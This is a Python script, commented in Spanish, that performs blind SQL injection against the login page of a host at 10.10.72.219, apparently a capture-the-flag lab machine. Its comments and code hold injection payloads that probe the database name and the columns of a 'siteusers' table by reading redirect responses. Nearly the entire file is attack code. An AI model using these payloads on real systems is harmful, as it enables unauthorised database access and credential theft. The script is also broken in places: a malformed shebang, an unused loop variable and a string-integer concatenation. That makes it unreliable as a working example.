#!/bin/env/python3
import requests
import sys
from urllib.parse import urljoin

#Medir la longitud de la database con este paylaod 
#sqlip = ' and LENGTH(database())>1-- -

#Encontrar la database:
#' AND SUBSTRING(database(), 1, 1) = '{i}'-- -
#Confirmamos si hay el username:
#' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'siteusers' AND column_name = 'username') > 0 -- -



ip_addres = "10.10.72.219"
url_login = urljoin(f'http://{ip_addres}/', "index.php")

caracter = "abcdefghijklmnopqrstuvwxyz0123456789"
tmp = ""
#Realizar la solicitud post
with requests.Session() as session:
    for i in range(1,12):
        for n in range(1,8):
            #reemplzar el payload en medida de uso
            sqlip = f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'siteusers' AND column_name = 'username') > {n} -- -"
            #Ingreso de datos al script
            login ={
                'username': 'kitty' + sqlip,
                'password' : 'holamundo'
            }
            respuesta = session.post(url_login,data=login,allow_redirects=False)
            status_code = respuesta.status_code
            if status_code == 302:
                print(f"login full para {i}")
                tmp += i
                print(tmp)
            #Solicitud GET para cerrar sesi√≥n (logout.php)
                url_logout = urljoin(f'http://{ip_addres}/', "logout.php")
                logout_respuesta = session.get(url_logout)
                if logout_respuesta.ok:
                    continue
                else:
                    print("revisar respuestas")
            else:
                continue